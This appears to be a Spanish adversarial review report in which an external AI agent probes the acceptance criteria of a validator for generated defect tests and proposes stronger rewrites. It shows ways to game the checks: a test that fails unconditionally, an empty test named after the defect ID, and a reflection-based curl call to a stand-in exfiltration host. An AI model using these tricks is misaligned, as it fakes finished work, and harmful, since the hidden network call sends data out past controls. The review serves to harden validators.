# Revisión adversarial externa

- **Proveedor:** Google Gemini
- **Modelo:** `gemini-3.5-flash-lite`
- **Run ID:** `gha-35804447917-1`
- **Rol:** agente externo; no revisión humana

## Ataques

### 1. AC-01 — Incondicionalidad semántica camuflada

- **Familia:** parada anticipada
- **Original:** sí
- **Criterio objetivo:** Cada informe admitido produce al menos un caso de prueba ejecutable cuya falla se debe a una aserción derivada del comportamiento esperado declarado y no a una falla incondicional del propio test.

**Salida concreta engañosa**

```text
def test_defect(): raise AssertionError("Mock expected behavior assertion failure")
```

**Por qué el validador la aceptaría:** El validador busca sintácticamente una palabra clave de aserción en el código generado pero no evalúa semánticamente si el error surge del código bajo prueba o de una interrupción deliberada e incondicional hardcodeada en el test stub.

### 2. AC-02 — Colisión nominal de identificador

- **Familia:** relleno estructural
- **Original:** no
- **Criterio objetivo:** Cada archivo de prueba generado es descubierto por el runner registrado y contiene al menos un caso ejecutable asociado al identificador del informe de defecto.

**Salida concreta engañosa**

```text
def test_DEF_ABST_001(): pass
```

**Por qué el validador la aceptaría:** El test runner descubre la función debido a su prefijo de nomenclatura estándar y encuentra embebido el identificador exacto del informe de defecto, cumpliendo con la regex de descubrimiento sin ejecutar ninguna validación real sobre la lógica del defecto.

### 3. AC-03 — Invocación indirecta mediante reflexión

- **Familia:** coste desplazado
- **Original:** sí
- **Criterio objetivo:** Ningún caso generado escribe fuera del área de pruebas autorizada ni realiza llamadas de red o efectos externos.

**Salida concreta engañosa**

```text
import subprocess; getattr(subprocess, 'run')(['curl', 'http://external-server/exfiltrate'])
```

**Por qué el validador la aceptaría:** El análisis estático o los ganchos de restricciones negativas buscan llamadas directas explícitas como 'requests.get' u operaciones de apertura de sockets comunes, pero fallan al auditar llamadas arbitrarias de red ejecutadas a través de la API estándar de reflexión e indirección dinámica de Python.

## Evaluación por criterio

| Criterio | Estado | Razón | Reescritura sugerida |
|---|---|---|---|
| AC-01 | broken | La aserción puede ser burlada inyectando una excepción artificial codificada estáticamente dentro del cuerpo del test. | validator:defect_reproduction_rate >= 1.0 AND test:executes_target_code_path_successfully_before_failure |
| AC-02 | broken | El runner solo valida la presencia nominal del string del identificador y la recolección del test vacío sin comprobar ejecución de aserciones válidas. | test:generated_tests_collect_and_run AND test:asserts_at_least_one_non_trivial_condition |
| AC-03 | broken | Las restricciones negativas basados en escaneos estáticos simples se evitan utilizando llamadas indirectas por reflexión. | test:no_external_effects AND sandbox:network_namespace_isolated == true |
| AC-04 | resists | La verificación ledger se basa en métricas objetivas de tiempo y coste registradas de forma centralizada y no manipulables directamente por el generador. | No requerida |
| AC-05 | broken | Al haberse descartado el criterio por falta de presupuesto, la trazabilidad entre el informe y el test carece de cualquier garantía de verificación automatizada. | test:traceability_matches_source AND source:explicit_line_pointer_verified == true |

## Notas generales

La auditoría adversarial demuestra que las validaciones sintácticas y superficiales son vulnerables a construcciones de código indirectas y stubs vacíos. Se recomienda endurecer los validadores incorporando instrumentación de ejecución y restricciones a nivel de contenedor.
